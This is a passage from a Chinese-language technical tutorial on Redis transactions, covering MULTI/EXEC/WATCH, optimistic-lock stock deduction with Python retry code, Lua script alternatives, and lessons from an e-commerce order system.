<p>Redis 的事务是一个命令序列的集合，这些命令要么全部执行，要么全部不执行。听起来是不是很像数据库事务？但别急，Redis 的事务更像是“轻量版”。它通过将多个命令放入队列并一次性执行，保证了一定程度的<strong>原子性</strong>，但对<strong>隔离性</strong>和<strong>一致性</strong>的支持有限，更别提回滚了。</p>
<p>与关系型数据库（如 MySQL）的事务相比，Redis 事务更像是一个“计划表”：你先列好要做的事（命令），然后交给 Redis 在某个时刻统一执行。MySQL 的事务可以回滚，Redis 却不行；MySQL 有锁机制保证隔离性，Redis 则更依赖客户端的配合。这种差异源于 Redis 的设计哲学：追求极致性能，简化复杂逻辑。</p>
<p><strong>表格1：Redis事务 vs 传统数据库事务对比</strong></p>



































<table><thead><tr><th>特性</th><th>Redis 事务</th><th>传统数据库事务 (如 MySQL)</th></tr></thead><tbody><tr><td>原子性</td><td>支持（有限）</td><td>完全支持</td></tr><tr><td>隔离性</td><td>部分支持（依赖 WATCH）</td><td>完全支持（锁机制）</td></tr><tr><td>一致性</td><td>依赖客户端逻辑</td><td>完全支持</td></tr><tr><td>回滚</td><td>不支持</td><td>支持</td></tr><tr><td>性能开销</td><td>低</td><td>较高</td></tr></tbody></table>
<h3 data-id="heading-6">2. 核心命令简介</h3>
<p>Redis 的事务机制主要围绕以下四个命令展开：</p>
<ul>
<li><strong><code>MULTI</code></strong>：事务的“开场白”，告诉 Redis 接下来的命令需要入队，而不是立即执行。</li>
<li><strong><code>EXEC</code></strong>：事务的“压轴戏”，触发队列中所有命令按顺序执行。</li>
<li><strong><code>DISCARD</code></strong>：事务的“撤退键”，放弃当前队列，清空未执行的计划。</li>
<li><strong><code>WATCH</code></strong>：事务的“哨兵”，监控指定键的变动，用于实现乐观锁。</li>
</ul>
<p>这些命令就像一个剧本的导演、演员和道具师，配合起来完成一场演出。接下来，我们通过工作流程看看它们如何“上台”。</p>
<h3 data-id="heading-7">3. 事务的基本工作流程</h3>
<p>Redis 事务的执行可以分为两个阶段：<strong>命令入队</strong>和<strong>执行阶段</strong>。用一个生活化的比喻来说，就像你在餐厅点餐：先把菜名报给服务员（入队），然后等服务员确认后一起上菜（执行）。</p>
<ul>
<li><strong>命令入队</strong>：调用 <code>MULTI</code> 后，后续命令不会立即执行，而是被放入一个队列。Redis 会返回 <code>QUEUED</code> 表示命令已入队。</li>
<li><strong>执行阶段</strong>：调用 <code>EXEC</code> 后，队列中的命令按顺序执行。如果中途有语法错误的命令，整个事务会失败；如果是运行时错误（如操作类型不匹配），则只影响该命令，其他命令照常执行。</li>
</ul>
<p><strong>示意图1：Redis事务基本流程</strong></p>
<pre><code class="hljs language-sql" lang="sql">[客户端]          [Redis服务器]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | 开启事务</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
命令<span class="hljs-number">1</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
命令<span class="hljs-number">2</span> <span class="hljs-comment">-------------&gt; | QUEUED</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | 执行队列中的命令</span>
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
<span class="hljs-operator">&lt;</span><span class="hljs-comment">------------------- | 返回结果</span>
</code></pre>
<h3 data-id="heading-8">4. 代码示例</h3>
<p>让我们通过一个简单的例子感受一下事务的魅力。假设我们要更新用户的积分和最后更新时间，确保两者同时完成：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启事务</span>
MULTI
<span class="hljs-comment"># 增加用户1001的积分</span>
INCR user:points:1001
<span class="hljs-comment"># 设置用户1001的最后更新时间</span>
SET user:last_update:1001 <span class="hljs-string">"2025-04-07"</span>
<span class="hljs-comment"># 执行事务</span>
EXEC
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>MULTI</code>：标志事务开始，后续命令被放入队列。</li>
<li><code>INCR</code>：将积分加 1，返回新的积分值。</li>
<li><code>SET</code>：设置时间戳，保证与积分更新同步。</li>
<li><code>EXEC</code>：触发队列执行，返回 <code>[2, "OK"]</code>，表示两个命令的结果。</li>
</ul>
<p>如果执行成功，积分和时间戳会同时更新；如果网络中断或语法错误，事务会整体失败。这种“全有或全无”的特性，正是 Redis 事务的核心价值。</p>
<p>通过本章，你已经掌握了 Redis 事务的基本概念和用法。但这只是“热身”，<code>MULTI</code> 和 <code>EXEC</code> 背后还有更多细节值得探索。比如，命令队列是如何管理的？事务失败时会发生什么？接下来，我们将深入剖析 <code>MULTI</code> 和 <code>EXEC</code> 的工作原理，带你看看这对“黄金搭档”的真面目。</p>
<hr/>
<h2 data-id="heading-9">三、MULTI与EXEC的深度剖析（约800-1000字）</h2>
<p>在 Redis 事务的舞台上，<code>MULTI</code> 和 <code>EXEC</code> 是绝对的主角。如果说上一章是让你“初识”它们，这一章则是带你“深入”它们的内核，拆解工作原理、分析优劣，并通过实战场景让你感受到它们的真正威力。准备好了吗？让我们一探究竟！</p>
<h3 data-id="heading-10">1. MULTI的工作原理</h3>
<p><code>MULTI</code> 是事务的起点，它的本质是为客户端创建一个命令队列。打个比喻，它就像一个“购物篮”，你把想买的东西（命令）一件件放进去，等到结账（<code>EXEC</code>）时再统一处理。在 Redis 的实现中，这个队列存储在客户端的内存上下文中，服务端会为每个开启事务的客户端维护一个独立状态。</p>
<h4 data-id="heading-11">命令队列的内存管理</h4>
<p>每调用一次 <code>MULTI</code>，Redis 会为当前连接分配一个事务状态结构体，里面包含一个命令列表。当你输入后续命令时，Redis 不会立即执行，而是将其封装成一个命令对象，标记为 <code>QUEUED</code> 并加入队列。这种延迟执行的设计，既保证了命令的顺序性，也降低了频繁交互的开销。</p>
<h4 data-id="heading-12">事务中的错误处理</h4>
<p>不过，队列并非万能。Redis 对错误的处理分为两类：</p>
<ul>
<li><strong>语法错误</strong>：比如输入了不存在的命令 <code>SETX</code>，在入队列时就会被检测到。调用 <code>EXEC</code> 时，整个事务会被直接取消。</li>
<li><strong>执行时错误</strong>：比如对字符串键执行 <code>LPUSH</code>，这种错误只有在 <code>EXEC</code> 执行时才会暴露，但不会影响其他命令的执行。</li>
</ul>
<p><strong>表格2：错误类型对比</strong></p>




















<table><thead><tr><th>错误类型</th><th>检测时机</th><th>对事务的影响</th></tr></thead><tbody><tr><td>语法错误</td><td>入队时</td><td>整个事务失败</td></tr><tr><td>执行时错误</td><td>执行时 (<code>EXEC</code>)</td><td>仅影响出错命令，其他继续</td></tr></tbody></table>
<h3 data-id="heading-13">2. EXEC的执行逻辑</h3>
<p><code>EXEC</code> 是事务的“执行官”，负责将队列中的命令逐一变为现实。它的核心在于<strong>原子性</strong>：一旦开始执行，队列中的命令会连续完成，不会被其他客户端的请求打断。这种特性得益于 Redis 的单线程事件循环模型。</p>
<h4 data-id="heading-14">原子性保证的边界</h4>
<p>但原子性也有边界。如果事务中包含语法错误的命令，<code>EXEC</code> 会返回空结果（<code>nil</code>），队列直接作废。此外，如果 Redis 服务端在执行过程中崩溃，事务的原子性就无法保证了。因此，事务的可靠性很大程度上依赖稳定的网络和服务器环境。</p>
<h4 data-id="heading-15">性能影响</h4>
<p>事务的长度直接影响性能。队列越长，执行时间越久，尤其是在高并发场景下，可能会阻塞其他请求。经验法则是：尽量保持事务“短小精悍”，避免把复杂逻辑塞进去。</p>
<h3 data-id="heading-16">3. 优势与局限性</h3>
<h4 data-id="heading-17">优势</h4>
<ul>
<li><strong>简单高效</strong>：相比传统数据库事务，Redis 事务无需锁机制，开销极低。</li>
<li><strong>轻量原子性</strong>：适合需要批量操作的场景，如缓存更新、计数器累加。</li>
</ul>
<h4 data-id="heading-18">局限性</h4>
<ul>
<li><strong>不支持回滚</strong>：一旦命令入队，无法中途撤销，失败了只能从头再来。</li>
<li><strong>错误处理复杂</strong>：客户端需要提前预判可能的问题，比如类型 mismatch。</li>
</ul>
<p><strong>示意图2：MULTI/EXEC 执行过程</strong></p>
<pre><code class="hljs language-sql" lang="sql">[客户端]          [Redis服务器]
  <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>
MULTI <span class="hljs-comment">-------------&gt; | 创建队列</span>
<span class="hljs-keyword">SET</span> key1 val <span class="hljs-comment">------&gt; | QUEUED</span>
INCR key2 <span class="hljs-comment">---------&gt; | QUEUED</span>
<span class="hljs-keyword">EXEC</span> <span class="hljs-comment">--------------&gt; | 按序执行，返回 [OK, 2]</span>
</code></pre>
<h3 data-id="heading-19">4. 实战场景</h3>
<h4 data-id="heading-20">场景1：批量更新缓存数据</h4>
<p>假设我们需要同时更新用户的姓名和年龄到缓存中，确保两者一致：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开启事务</span>
MULTI
<span class="hljs-comment"># 设置用户1001的姓名</span>
SET cache:user:1001:name <span class="hljs-string">"Alice"</span>
<span class="hljs-comment"># 设置用户1001的年龄</span>
SET cache:user:1001:age <span class="hljs-string">"25"</span>
<span class="hljs-comment"># 执行事务</span>
EXEC
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>MULTI</code>：启动事务，命令开始入队。</li>
<li><code>SET</code>：分别设置两个键值对。</li>
<li><code>EXEC</code>：一次性执行，返回 <code>[OK, OK]</code>。</li>
</ul>
<h4 data-id="heading-21">踩坑经验：事务命令过多导致性能下降</h4>
<p>在一次项目中，我们尝试用事务批量更新 100 个键值对，结果发现延迟从 1ms 飙升到 50ms。分析后发现，事务队列过长导致执行时间增加。<strong>解决办法</strong>：将大事务拆分为多个小事务，每次处理 10-20 个命令，性能恢复正常。</p>
<p><strong>最佳实践建议</strong>：</p>
<ul>
<li><strong>控制事务规模</strong>：单次事务尽量不超过 20 个命令。</li>
<li><strong>预检查数据</strong>：入队前验证键类型，避免执行时错误。</li>
</ul>
<p>通过本章，你已经摸清了 <code>MULTI</code> 和 <code>EXEC</code> 的“脾气”：简单高效，但也有局限。接下来，我们将迎来一个更有趣的角色——<code>WATCH</code>，它为事务引入了乐观锁机制，让并发控制变得更灵活。想知道如何用它解决库存扣减的难题？请继续关注下一章！</p>
<hr/>
<h2 data-id="heading-22">四、WATCH命令与乐观锁实战（约1000-1200字）</h2>
<p>如果说 <code>MULTI</code> 和 <code>EXEC</code> 是 Redis 事务的“基础套餐”，那么 <code>WATCH</code> 就是一道“加料大餐”，为事务注入了并发控制的能力。在高并发场景下，如何确保数据一致性而不引入昂贵的锁开销？<code>WATCH</code> 给出了一个优雅的答案。本章将带你深入理解它的原理，剖析工作流程，并通过实战案例展示它的威力。准备好迎接一场“乐观锁”的冒险吧！</p>
<h3 data-id="heading-23">1. WATCH的核心原理</h3>
<h4 data-id="heading-24">乐观锁的基本概念</h4>
<p><code>WATCH</code> 是 Redis 实现<strong>乐观锁</strong>的关键。什么是乐观锁？想象你在编辑一篇共享文档：你先下载一份副本，修改后再提交。如果提交时发现别人已经改了原文档，你就得重新开始。乐观锁假设冲突不常发生，因此不提前加锁，而是通过版本检查来判断是否需要重试。</p>
<p>在 Redis 中，<code>WATCH</code> 监控一个或多个键。如果这些键在事务执行前被其他客户端修改，事务就会失败。这种机制避免了悲观锁的资源争抢，非常适合高并发、读多写少的场景。</p>
<h4 data-id="heading-25">WATCH如何监控键的修改</h4>
<p>调用 <code>WATCH</code> 后，Redis 会为被监控的键记录一个“快照”。在 <code>EXEC</code> 执行前，Redis 会检查这些键是否被修改（比如通过 <code>SET</code>、<code>INCR</code> 等命令）。如果有变化，事务会被取消，<code>EXEC</code> 返回 <code>nil</code>。</p>
<h3 data-id="heading-26">2. WATCH的工作流程</h3>
<p><code>WATCH</code> 通常与 <code>MULTI</code> 和 <code>EXEC</code> 配合使用，整个流程可以分为三个阶段：</p>
<ol>
<li><strong>监控阶段</strong>：调用 <code>WATCH</code> 指定要监控的键。</li>
<li><strong>准备阶段</strong>：读取键值，基于当前数据准备事务命令。</li>
<li><strong>执行阶段</strong>：用 <code>MULTI</code> 和 <code>EXEC</code> 提交事务，如果键被修改则失败。</li>
</ol>
<p><strong>示意图3：WATCH工作流程</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">[客户端A]         [Redis服务器]         [客户端B]
  |                  |                    |
WATCH <span class="hljs-keyword">key</span> ---------&gt; | 监控 <span class="hljs-keyword">key</span>           |
<span class="hljs-keyword">GET</span> <span class="hljs-keyword">key</span> -----------&gt; | 返回当前值         |
  |                  |                    |
MULTI -------------&gt; | 开启事务           | <span class="hljs-keyword">SET</span> <span class="hljs-keyword">key</span> new_val --&gt; | 修改 <span class="hljs-keyword">key</span>
命令<span class="hljs-number">1</span> -------------&gt; | QUEUED             |
EXEC --------------&gt; | 检查 <span class="hljs-keyword">key</span> 被修改，  |
  |                  | 返回 nil           |
</code></pre>
<h3 data-id="heading-27">3. 优势与特色</h3>
<ul>
<li><strong>轻量级并发控制</strong>：无需锁住资源，性能开销极低。</li>
<li><strong>适用场景</strong>：特别适合瞬时高并发的场景，如秒杀、库存扣减。</li>
</ul>
<p>但它也有局限：事务失败后需要客户端主动重试，增加了开发复杂度。</p>
<h3 data-id="heading-28">4. 实战案例</h3>
<h4 data-id="heading-29">场景：电商库存扣减</h4>
<p>在电商系统中，库存扣减是一个经典的并发问题。我们希望确保库存不会超卖，同时避免锁的开销。以下是一个使用 <code>WATCH</code> 的实现：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 监控库存键</span>
WATCH stock:product:1001
<span class="hljs-comment"># 获取当前库存</span>
GET stock:product:1001
<span class="hljs-comment"># 假设返回 "10"，检查是否足够</span>
<span class="hljs-comment"># 如果库存 &gt;= 购买数量，则继续</span>
MULTI
<span class="hljs-comment"># 减少库存</span>
DECR stock:product:1001
<span class="hljs-comment"># 执行事务</span>
EXEC
<span class="hljs-comment"># 如果返回 nil，说明库存被其他客户端修改，需重试</span>
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>WATCH</code>：监控库存键，确保事务期间不被篡改。</li>
<li><code>GET</code>：读取当前库存，用于判断是否可扣减。</li>
<li><code>DECR</code>：减少库存，原子操作。</li>
<li><code>EXEC</code>：提交事务，返回结果。如果返回 <code>nil</code>，表示事务失败。</li>
</ul>
<h4 data-id="heading-30">踩坑经验：WATCH滥用导致重试过多</h4>
<p>在一次秒杀活动中，我们对多个键（如库存、用户限购次数）都用了 <code>WATCH</code>，结果高并发下事务失败率飙升，客户端陷入频繁重试。分析发现，监控过多键增加了冲突概率。<strong>解决办法</strong>：只监控核心键（如库存），其他逻辑通过业务层校验，失败率降低到 5% 以下。</p>
<h4 data-id="heading-31">重试逻辑示例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> time

client = redis.Redis(host=<span class="hljs-string">'localhost'</span>, port=<span class="hljs-number">6379</span>)
product_id = <span class="hljs-string">"1001"</span>
key = <span class="hljs-string">f"stock:product:<span class="hljs-subst">{product_id}</span>"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">deduct_stock</span>(<span class="hljs-params">quantity</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-comment"># 监控库存</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()  <span class="hljs-comment"># 取消监控</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"库存不足"</span>
        
        <span class="hljs-comment"># 开启事务</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:  <span class="hljs-comment"># 执行成功</span>
                <span class="hljs-keyword">return</span> <span class="hljs-string">"扣减成功"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># 简单退避重试</span>
            <span class="hljs-keyword">continue</span>

<span class="hljs-built_in">print</span>(deduct_stock(<span class="hljs-number">1</span>))
</code></pre>
<p><strong>代码注释</strong>：</p>
<ul>
<li><code>watch</code>：监控库存键。</li>
<li><code>pipeline().multi()</code>：开启事务。</li>
<li><code>execute()</code>：提交事务，捕获 <code>WatchError</code> 处理失败。</li>
</ul>
<h3 data-id="heading-32">5. 最佳实践</h3>
<h4 data-id="heading-33">如何选择监控的键</h4>
<ul>
<li><strong>原则</strong>：只监控对事务结果有直接影响的键，避免过度监控。</li>
<li><strong>示例</strong>：在库存扣减中，只 <code>WATCH</code> 库存键，而非用户数据。</li>
</ul>
<h4 data-id="heading-34">重试机制的设计</h4>
<ul>
<li><strong>指数退避</strong>：失败后等待时间逐渐增加（如 0.1s、0.2s、0.4s），避免瞬间重试风暴。</li>
<li><strong>固定间隔</strong>：简单场景下，固定 100ms 重试即可。</li>
<li><strong>上限控制</strong>：设置最大重试次数（如 5 次），超出后返回错误。</li>
</ul>
<p><strong>表格3：重试策略对比</strong></p>





























<table><thead><tr><th>策略</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td>指数退避</td><td>减少资源争抢</td><td>实现稍复杂</td><td>高并发秒杀</td></tr><tr><td>固定间隔</td><td>简单易用</td><td>可能引发重试高峰</td><td>低冲突场景</td></tr><tr><td>无重试</td><td>无额外开销</td><td>失败即放弃</td><td>非关键操作</td></tr></tbody></table>
<p>通过本章，你已经掌握了 <code>WATCH</code> 的乐观锁魔法，它让 Redis 事务在并发场景下如虎添翼。但事务还有更多玩法，比如与 Lua 脚本的结合，以及分布式环境下的挑战。下一章，我们将进入“高级应用与优化”的领域，探索更广阔的可能性！</p>
<hr/>
<h2 data-id="heading-35">五、事务机制的高级应用与优化（约800-1000字）</h2>
<p>经过前几章的探索，你已经熟悉了 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 的基本用法和实战技巧。但在真实项目中，事务机制往往需要与更复杂的场景结合，比如 Lua 脚本、性能优化，甚至分布式环境下的挑战。本章将带你从“熟练”迈向“精通”，解锁事务的高级玩法，同时分享一些优化经验和踩坑教训。让我们一起进入 Redis 事务的“进阶模式”吧！</p>
<h3 data-id="heading-36">1. 事务与Lua脚本的对比</h3>
<p>Redis 提供了两种实现原子操作的方式：事务和 Lua 脚本。它们各有千秋，选择哪一个取决于你的业务需求。</p>
<h4 data-id="heading-37">事务的轻量 vs Lua的灵活</h4>
<ul>
<li><strong>事务</strong>：通过 <code>MULTI</code> 和 <code>EXEC</code> 实现，简单直接，适合轻量级批量操作。它的优势在于易上手，客户端只需按顺序发送命令即可。</li>
<li><strong>Lua 脚本</strong>：通过 <code>EVAL</code> 执行自定义逻辑，支持条件判断和循环，功能更强大。它的优势在于灵活性，可以在服务端完成复杂计算。</li>
</ul>
<p><strong>表格4：事务 vs Lua 脚本对比</strong></p>



































<table><thead><tr><th>特性</th><th>事务 (MULTI/EXEC)</th><th>Lua 脚本</th></tr></thead><tbody><tr><td>实现方式</td><td>命令队列</td><td>脚本执行</td></tr><tr><td>原子性</td><td>支持</td><td>支持</td></tr><tr><td>灵活性</td><td>较低（固定命令）</td><td>高（支持逻辑）</td></tr><tr><td>性能开销</td><td>低</td><td>稍高（解析脚本）</td></tr><tr><td>调试难度</td><td>低</td><td>较高</td></tr></tbody></table>
<h4 data-id="heading-38">何时选择事务，何时选择Lua？</h4>
<ul>
<li><strong>用事务</strong>：当操作简单且固定时，比如批量更新几个键值对。</li>
<li><strong>用 Lua</strong>：当需要条件判断或动态逻辑时，比如“检查库存并扣减”的组合操作。</li>
</ul>
<p><strong>Lua 示例</strong>（替代事务的库存扣减）：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">local</span> stock = redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>])
<span class="hljs-keyword">if</span> <span class="hljs-built_in">tonumber</span>(stock) &gt;= <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span>
    redis.call(<span class="hljs-string">'DECRBY'</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>])
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>调用：<code>EVAL "script" 1 stock:product:1001 1</code></p>
<p><strong>对比结论</strong>：事务适合“简单粗暴”的场景，Lua 更适合“精细化”控制。</p>
<h3 data-id="heading-39">2. 性能优化技巧</h3>
<p>事务虽然高效，但用不好也可能成为性能瓶颈。以下是几条实战中总结的优化建议：</p>
<h4 data-id="heading-40">减少事务中的命令数量</h4>
<p>事务越长，执行时间越久，尤其在高并发下会拖慢整体响应。<strong>建议</strong>：单次事务控制在 10-20 个命令以内，超出时考虑拆分或用 Lua。</p>
<h4 data-id="heading-41">避免耗时操作</h4>
<p>某些命令（如 <code>KEYS</code> 或 <code>SMEMBERS</code>）会扫描大量数据，如果放在事务中，可能导致阻塞。<strong>解决办法</strong>：提前在事务外完成查询，只在事务中执行修改操作。</p>
<p><strong>错误示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">MULTI
KEYS user:*
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<p><strong>优化后</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 提前查询</span>
KEYS user:*
<span class="hljs-comment"># 再执行事务</span>
MULTI
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<h3 data-id="heading-42">3. 分布式场景下的扩展</h3>
<p>在 Redis Cluster 中，事务的使用会受到限制，因为集群将数据分片到不同槽（slot），而事务要求所有键在同一槽内。</p>
<h4 data-id="heading-43">Redis Cluster中的事务限制</h4>
<ul>
<li><strong>问题</strong>：如果事务涉及的键分布在多个槽，Redis 会报错 <code>CROSSSLOT</code>。</li>
<li><strong>解决办法</strong>：使用哈希标签（hash tag），如 <code>{user:1001}.name</code> 和 <code>{user:1001}.age</code>，确保键落在同一槽。</li>
</ul>
<h4 data-id="heading-44">结合业务拆分</h4>
<p>对于跨槽需求，可以将业务逻辑拆分到客户端，先分别操作不同槽的数据，再通过事务保证局部原子性。这种方式虽然复杂，但能绕过集群限制。</p>
<h3 data-id="heading-45">4. 踩坑案例</h3>
<h4 data-id="heading-46">案例1：事务中网络中断导致数据不一致</h4>
<p>在一次订单处理中，我们用事务更新订单状态和库存，但网络抖动导致 <code>EXEC</code> 未执行成功，客户端却认为已完成。结果库存扣了，订单状态没变。<br/>
<strong>解决方案</strong>：在事务后增加校验逻辑，确认结果一致性：</p>
<pre><code class="hljs language-python" lang="python">pipe = client.pipeline()
pipe.multi()
pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">'order:1001:status'</span>, <span class="hljs-string">'paid'</span>)
pipe.decr(<span class="hljs-string">'stock:1001'</span>)
result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"事务失败，需回滚或重试"</span>)
</code></pre>
<h4 data-id="heading-47">案例2：误用WATCH导致死循环</h4>
<p>在高并发场景下，<code>WATCH</code> 失败后未设置重试上限，导致客户端陷入死循环，CPU 占用飙升。<br/>
<strong>解决方案</strong>：加入重试次数限制：</p>
<pre><code class="hljs language-python" lang="python">max_retries = <span class="hljs-number">5</span>
<span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_retries):
    <span class="hljs-keyword">try</span>:
        client.watch(<span class="hljs-string">'stock:1001'</span>)
        stock = client.get(<span class="hljs-string">'stock:1001'</span>)
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(<span class="hljs-string">'stock:1001'</span>)
        pipe.execute()
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> redis.WatchError:
        <span class="hljs-keyword">if</span> attempt == max_retries - <span class="hljs-number">1</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"重试次数超限"</span>)
        time.sleep(<span class="hljs-number">0.1</span>)
</code></pre>
<p>通过本章，你已经掌握了事务的高级用法和优化技巧，从 Lua 脚本的灵活性到分布式环境的应对策略，再到踩坑后的反思，Redis 事务的“全貌”逐渐清晰。接下来，我们将分享一些真实项目中的经验教训，告诉你如何把这些知识落地到实际开发中。准备好迎接实战的“干货”了吗？</p>
<hr/>
<h2 data-id="heading-48">六、项目经验分享：事务机制的最佳实践（约600-800字）</h2>
<p>理论和技巧固然重要，但真正让技术“落地”的，还是项目中的实战经验。在这一章，我将结合过去几年在实时订单处理系统中的实践，分享如何用 <code>MULTI</code>、<code>EXEC</code> 和 <code>WATCH</code> 解决实际问题，同时剖析踩过的坑和总结的最佳实践。希望这些“干货”能为你的项目提供启发！</p>
<h3 data-id="heading-49">1. 实际项目中的应用</h3>
<h4 data-id="heading-50">项目背景：实时订单处理系统</h4>
<p>在一个电商平台中，我们需要处理用户的下单请求，确保订单状态更新和库存扣减同时完成，同时应对高峰期的并发压力。Redis 事务成为我们的首选工具，因为它既能保证原子性，又不会引入锁的额外开销。</p>
<h4 data-id="heading-51">如何使用 MULTI/EXEC 保证数据一致性</h4>
<p>我们设计了一个事务来同步更新订单和库存：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_order</span>(<span class="hljs-params">client, order_id, product_id, quantity</span>):
    pipe = client.pipeline()
    pipe.multi()
    pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"order:<span class="hljs-subst">{order_id}</span>:status"</span>, <span class="hljs-string">"paid"</span>)  <span class="hljs-comment"># 更新订单状态</span>
    pipe.decrby(<span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>, quantity)  <span class="hljs-comment"># 扣减库存</span>
    result = pipe.execute()
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># 返回 [True, remaining_stock]</span>
</code></pre>
<p><strong>应用效果</strong>：在单节点 Redis 上，这个事务确保了两步操作的原子性，每天处理数万订单未出现不一致问题。</p>
<h4 data-id="heading-52">如何用 WATCH 实现并发控制</h4>
<p>在秒杀活动中，我们引入 <code>WATCH</code> 防止库存超卖：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_in_seckill</span>(<span class="hljs-params">client, product_id, quantity</span>):
    key = <span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):  <span class="hljs-comment"># 最多重试3次</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()
            <span class="hljs-keyword">return</span> <span class="hljs-string">"库存不足"</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decrby(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"购买成功"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"购买失败，请重试"</span>
</code></pre>
<p><strong>应用效果</strong>：在 5000 QPS 的压力下，库存扣减准确无误，失败率控制在 2% 以内。</p>
<h3 data-id="heading-53">2. 踩坑与教训</h3>
<h4 data-id="heading-54">错误案例：未正确处理 EXEC 失败</h4>
<p>在早期版本中，我们假设 <code>EXEC</code> 返回非空就表示成功，但一次网络抖动导致结果丢失，库存扣了但订单未更新。<br/>
<strong>教训</strong>：不能仅依赖返回值的存在性，必须验证每个命令的执行结果。<br/>
<strong>解决方案</strong>：完善异常捕获：</p>
<pre><code class="hljs language-python" lang="python">result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(result) != <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"事务失败，需检查数据一致性"</span>)
</code></pre>
<h4 data-id="heading-55">错误案例：WATCH 重试未加限制</h4>
<p>在秒杀场景中，高并发下 <code>WATCH</code> 频繁失败，客户端未设置上限，导致请求堆积，Redis 负载激增。<br/>
<strong>教训</strong>：重试必须可控，避免无限循环。<br/>
<strong>解决方案</strong>：设置最大重试次数（如上例中的 3 次），并记录日志便于排查。</p>
<h3 data-id="heading-56">3. 经验总结</h3>
<h4 data-id="heading-57">事务设计的“三原则”</h4>
<p>基于多次实战，我总结了 Redis 事务设计的三个关键词：</p>
<ul>
<li><strong>轻量</strong>：事务尽量短小，避免塞入复杂逻辑。</li>
<li><strong>明确</strong>：明确每个命令的目的和预期结果，便于调试。</li>
<li><strong>可控</strong>：加入重试和异常处理，确保失败也能优雅退出。</li>
</ul>
<h4 data-id="heading-58">推荐工具与调试技巧</h4>
<ul>
